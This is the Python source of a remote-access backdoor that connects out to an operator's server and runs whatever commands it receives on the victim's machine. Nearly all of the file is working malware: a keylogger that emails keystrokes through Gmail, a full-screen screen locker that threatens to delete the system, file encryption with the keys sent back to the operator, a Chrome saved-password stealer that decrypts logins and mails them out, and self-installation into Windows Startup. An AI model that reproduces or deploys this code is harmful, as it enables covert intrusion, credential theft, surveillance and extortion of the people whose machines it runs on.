import socket
import subprocess
import json
import os
import base64
from pynput.keyboard import Listener                         
import threading, smtplib                                     # smtplib - to work with a mail(to be able to receive mail with the result, enable access to unverified applications in your gmail account and use your login and password)
import tkinter as tk
from tkinter import *
import pyautogui
import tkinter.font as font
import shutil
import sqlite3
import win32crypt
import sys
from Cryptodome.Cipher import AES 
from datetime import timezone, datetime, timedelta
from cryptography.fernet import Fernet


help_info = ("""
[+] List of available commands:
1.  cd <path> - change working directory depending on argument. Example: cd Documents
2.  delete <filename_or_path_to_file> - delete some file depending on argument. Example: delete work.txt
3.  message <message_text> - show message in window to client. Example: message Hello!
4.  screenshot <image_name> - take screenshot of client window and download it on your device.It will be deleted from client pc. Example: screenshot image1.png
5.  download-net <file_url> - download file to client pc. Example: download-net https://miro.medium.com/max/10000/0*wZAcNrIWFFjuJA78 
6.  download <file name> - download some file from client pc to yours. Example: download work.txt 
7.  upload <file name> - upload some file from your pc to pc of client. Example: upload mywork.txt
8.  keylogger <time_to_work> - keylogger with sending results to your gmail. Example: keylogger 100
9.  winlocker <end_time> - winlocker. Example: winlocker 100
10. encrypt <filename> - encrypt some file and get key for decrypting to your pc. Example: encrypt work.txt 
11. decrypt <encrypted_filename> - decrypt some file with keyfile on your pc. Use standart keyfilename which = "name of encrypted file + .key" . Example: decrypt work.txt
12. wingrubber - sends saved google chrome password of client to your gmail. Example: wingrubber
13. win-reboot - reboot pc of client if it  is on Windows. Example: win-reboot
14. win-shutdown - shutdown pc of client if it is on Windows. Example: win-shutdown
15. win-logout -  log out of the client's user account if it is on Windows. Example: win-logout 
16. lin-reboot - reboot pc of client if it  is on Linux. Example: lin-reboot
17. lin-shutdown - shutdown pc of client if it is on Linux. Example: lin-shutdown
18. lin-logout - log out of the client's user account if it is on Linux. Example: lin-logout
19. startup - add this script to startup on Windows. Example: startup
20. help - display information about the available script functionality. Example: help
21. Any other commands will be treated as commands for execution in the client's cmd. The execution results will be sent to you. Example: dir  \n""")

class Backdoor:    
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True).decode("cp437")

    
    def reliable_send(self, data):                                            #sending data to server pc
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data)
        except:
            self.connection.send(json_data.encode())
    
    def reliable_receive(self):                                               #receiving information from the server computer to our pc using a stream of bytes                         
        json_data = ''.encode()
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_working_directory_to(self, path):                              #func to change our working directory
        os.chdir(path)
          
    def add_to_startup(self):                                                #adding to startup
        is_first = True
        if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
            shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
        else:
            is_first = False
            
    def read_file(self, path):                                               #reading a file with subsequent encoding into the [ascii] format 
        with open(path, "rb") as file:                                       #used with [reliable_send]
            return (base64.b64encode(file.read())).decode("ascii")

            
    def write_file(self, path, content):                                    #writing a data , that we get by using a [reliable_receive] to some file
        with open(path, "wb") as file:                                      #To write bytes to file , we need to use [b64decode] first
            file.write(base64.b64decode(content))                           
            return "[+] Upload succesful."
    
    def delete(self, path):                                                 #deleting file with [os.remove]
        os.remove(path)
        return "[+] File " + path + " was deleted succesfully."
       
    
    def take_screenshot(self, path):                                        #taking screenshots with [pyautogui],used with [read_file] with following sending to server-pc
        import pyautogui                                                                
        client_screenshot = pyautogui.screenshot()
        client_screenshot.save(path)
          
    def download_from_Net(self, url):                                       #downloading file to client-pc from Internet with using [requests]
        import requests                                                     #make a request, get the content of the file and write this content to some file
        file_name = url.split("/")[-1]
        
        img_data = requests.get(url).content
        with open(file_name, "wb") as handler:
            handler.write(img_data)
            return "[+] Download of " + file_name + " was succesful."
    
    def show_message(self, message):                                       #sending a message in a [tkinter] window
        main = Tk()
        w = Message(main, text = message)
        w.pack()
        mainloop()
        
    def win_reboot(self):                                                  #rebooting windows with [subprocess.call]
        subprocess.call(["shutdown", "/r"])     
    
    def win_shutdown(self):                                                #shutdown
        subprocess.call(["shutdown", "/s"])
        
    def win_logout(self):                                                  #logout
        subprocess.call(["shutdown", "/l"])
    
    def lin_reboot(self):                                                  #rebooting linux-like systems with [subprocess.call]
        os.system("sudo shutdown now -r")
    
    def lin_shutdown(self):                                                #shutdown
        os.system("sudo shutdown now -p")
        
    def lin_logout(self):                                                  #logout
        import getpass
        lin_user = getpass.getuser()
        os.system("skill -KILL -u " + str(lin_user))
    
    def encrypt(self, filename):                                           #encrypting some file
        key = Fernet.generate_key()                                        #used with sending key for decrypting to server-pc 
        with open(filename + ".key", "wb") as key_file:
            key_file.write(key)
        
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read all file data
            file_data = file.read()
        # encrypt data
        encrypted_data = f.encrypt(file_data)
        # write the encrypted file
        with open(filename, "wb") as file:
            file.write(encrypted_data)  
         
    def decrypt(self, filename, keyfile):                                  #decrypting some file
        key = open(keyfile, "rb").read()                                   #used with key for decrypting from server-pc 
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read the encrypted data
            encrypted_data = file.read()
        # decrypt data
        decrypted_data = f.decrypt(encrypted_data)
        # write the original file
        with open(filename, "wb") as file:
            file.write(decrypted_data)
        self.delete(keyfile)
        
            
            
    def run(self):                                                         #running functions depending on the commands from server-pc              
        while True:                                                        #commands splited by spaces: [comand[0]] - command; [command[1]],[command[2]]... - directories,files,urls etc.
            command = self.reliable_receive()
            
            try:   
                if command[0] == "help":
                    command_result = help_info
                
                elif  command[0] == "cd" and len(command) > 1 :
                    self.change_working_directory_to(command[1]) 
                    command_result = "[+] Working directory changed to: " + os.getcwd()
                  
                elif command[0] == "exit":
                    self.connection.close()
                    exit()
                        
                    
                elif command[0] == "delete":
                    command_result = self.delete(command[1])
                
                elif command[0] == "message" and len(command)>1 :
                    self.show_message(command[1:])
                    command_result = "[+] Message was sent succesfully."
                    
                elif command[0] == "screenshot":
                    screen_to_process = self.take_screenshot(command[1])              
                    command_result = self.read_file(command[1])                 
                    self.delete(command[1])
                    
                elif command[0] == "download-net":
                    command_result = self.download_from_Net(command[1])        
                
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                
                
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
               
                
                elif command[0] == "keylogger":
                    Keylogger(command[1]).start()
                    command_result = "[+] Keylogger finished its work."
                
                elif command[0] == "winlocker":
                    Winlocker(command[1]).start_window()
                    command_result = "[+] Winlocker finished its work."
                
                elif command[0] == "wingrubber":
                    command_result = Grubber().run() 

                
                elif command[0] == "win-reboot":
                    self.win_reboot()
                    command_result = "[+] PC rebooted succesfully."
                
                elif command[0] == "win-shutdown":
                    self.win_shutdown()
                    command_result = "[+] PC shut down succesfully."
                
                elif command[0] == "win-logout":
                    self.win_logout()
                    command_result = "[+] PC logout was succesful."
                    
                elif command[0] == "lin-reboot":
                    self.lin_reboot()
                    command_result = "[+] PC rebooted succesfully."
                
                elif command[0] == "lin-shutdown":
                    self.lin_shutdown()
                    command_result = "[+] PC shut down succesfully."
                
                elif command[0] == "lin-logout":
                    self.lin_logout()
                    command_result = "[+] PC logout was succesful."
                
                elif command[0] == "decrypt":
                    self.write_file((command[1] + ".key"), command[2])
                    self.decrypt(command[1], command[1] + ".key")
                    command_result = "[+] File was decoded succesfully."
                
                elif command[0] == "encrypt":
                    self.encrypt(command[1])
                    command_result = self.read_file(command[1] + ".key")
                    self.delete(command[1] + ".key")
                
                elif command[0] == "startup":
                    self.add_to_startapp()
                    command_result = "[+] Adding to startapp was successful."     
                else:
                    command_result = self.execute_system_command(command) 
                       
            except:
                self.reliable_send("[!] Error during command execution.")
                       
            self.reliable_send(command_result)                         #sending result of command execution or message of succesful execution/fail to server-pc
            
             


class Keylogger:                                                       #keylogger with sending results of key presses to gmail 
                                                                       
    def __init__(self, end_iter,  time_interval = 20, email = "your_login@gmail.com", password= "your_password"):
        self.log = "keylogger is active!"                   
        self.interval = time_interval                      
        self.email = email
        self.password = password
        self.count = 0
        self.end_iter = int(end_iter)
        self.keyboard_listener = Listener(on_press= self.process_key_press)                    # Method Listener to record keystrokes with a method process_key_pressse
    
    def append_to_log(self, string):
        self.log = self.log + string                                                       # adding a text of key to empty log

    def process_key_press(self, key):
        try:                                                                               # try-except block to catch a AttributeError (common keys as r, t, f, a, etc) can be displayed in this way by method key.char,
            current_key =  str(key.char)                                                   # but some special keys as (space , tab , etc) can lead errors , because they are exceptions .
        except AttributeError:
            if key == key.space:                                                           # If user used a space bar, it will be it will be displayed as blank space in our log
                current_key = " "
            else:                                                                          # If user used a special keys (as tab , backspace , shift, etc), it will be displayed ...
                current_key = (" " + str(key) + " ").replace("Key.", "")                   # ... as (Key.tab , Key.backspace, Key.shift , etc) in our log

        self.append_to_log(str(current_key))

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)                                       # Connecting to google mail server with usage of port №587
        server.starttls()                                                                  # start tls-encryption, without it we wont be able to use the  smtplib library and send emails
        server.login(email, password)                                                      # Log in with our email and password
        server.sendmail(email, email, message)                                             # Sending a message to ourselves
        server.quit()                                                                      # close connection with the server
    

    
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)                       # sending email
        self.log = ""                                                                      # cleaning our log to make impossible sending it with the old information
        timer = threading.Timer(self.interval, self.report)                                # Using threading.Timer to reuse method report from time to time in second thread
        timer.start()
        self.count +=1
        if self.count == self.end_iter:
            timer.cancel()
            self.keyboard_listener.stop()
        
    def start(self):
        with self.keyboard_listener:
            self.report()                                                                 # Starting a method report
            self.keyboard_listener.join()                                                 # Starting a recording of  keystrokes    


class Winlocker:                                                       # Winlocker made with [pyautogui],[tkinter],[pygame]
    def __init__(self, time, password="py"):
        self.password = password
        self.time = int(time)
        self.stroke = " "
        self.root = Tk()
    

    def start_window(self):
        
        def blockroot():
            pyautogui.click(x=890,y=480)                
            pyautogui.moveTo(x=890,y=480)                
            self.root.protocol("WM_DELETE_WINDOW",blockroot) 
            self.root.update()
        
        
        
        def check_password(event):
            self.stroke = field_password.get()
            if self.stroke == self.password:
                self.root.destroy()
        
        
        
        self.root.title("Winlocker")
        self.root.attributes("-fullscreen",True)
        window_size = self.root.winfo_geometry()
        self.root.geometry(window_size)
        self.root.configure(bg='black')
        pyautogui.FAILSAFE=False
        
        
        text_author = Label(self.root,text="tigerk00",font="System 10",fg="#32CD32",bg="black")
        text_info = Label(self.root,text="Don't even think to turn off or restart your device - your system will delete immediately!",font = "System 25",fg="red",bg="black")
        field_password = Entry(self.root,fg="green",justify=CENTER, borderwidth=0) 
        but_unlock = Button(self.root,text="Разблокировать", borderwidth=0) 
        
        text_time=Label(text=self.time,font="System 15", bg = 'black' ,  fg = 'white' )
        text_remaining=Label(text="The remaining time of your system's life...",fg="white", bg = 'black' , font="System 15")
        MyFont = font.Font(family="Helvetica",size=15,weight="bold")
        field_password['font']= MyFont
        text_blocked = Label(self.root , text = "Your system is blocked !" , font = "System 30" , fg="green"  , bg="black") 
        text_deleting_system = "It's time to make some BOOOM!"
        
        text_author.place(x = 10 , y = 0)
        text_info.place(x = 100 , y = 70)
        field_password.place(width=200,height=30,x=860,y=480) 
        but_unlock.place(x = 900 , y = 520)
        text_time.place(x = 590 ,  y =150)
        text_remaining.place(x = 10 , y = 150)
        text_blocked.place(x=700 , y = 0)
        
        self.root.bind("<Return>" , check_password )            
        self.root.update()                                       
        pyautogui.moveTo(x = 900 , y = 520)
        pyautogui.click(x = 900 , y = 520)
         
        
        
        #countdown
        while self.stroke!= self.password:
            text_time.configure(text=self.time)
            self.root.after(300)
            if self.time==0:                                                  
                self.time=text_deleting_system                                            
            
            if self.time!=text_deleting_system:                                           
                self.time=self.time-1 
        
            blockroot()
    
        self.root.mainloop()       
        


class Grubber:                                                                 #Windows google passwords grubber with sending results to mail

    def __init__(self, login = "your_login@gmail.com", password = "your_password"):
        self.answer = ""
        self.login = login
        self.password = password
           
    def get_chrome_datetime(self,chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
       
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        
            
        

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self,password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""
                
    def run(self):
        # get the AES key
        
        key = self.get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                self.answer += f"Origin URL: {origin_url}" + "\n" 
                self.answer += f"Action URL: {action_url}" + "\n"
                self.answer += f"Username: {username}" + "\n"
                self.answer += f"Password: {password}" + "\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                self.answer += f"Creation date: {str(self.get_chrome_datetime(date_created))}" + "\n"
            if date_last_used != 86400000000 and date_last_used:
                self.answer += f"Last Used: {str(self.get_chrome_datetime(date_last_used))}" + "\n"
            
            
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
        
        print(self.answer)
        self.send_mail(self.login, self.password, "\n\n" + str(self.answer))
        
        return self.answer
        
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    

my_backdoor = Backdoor("server_pc_ip", server_pc_port)                                               #TYPE [SERVER-PC IP] AND [SERVER-PC PORT]     
my_backdoor.run()  
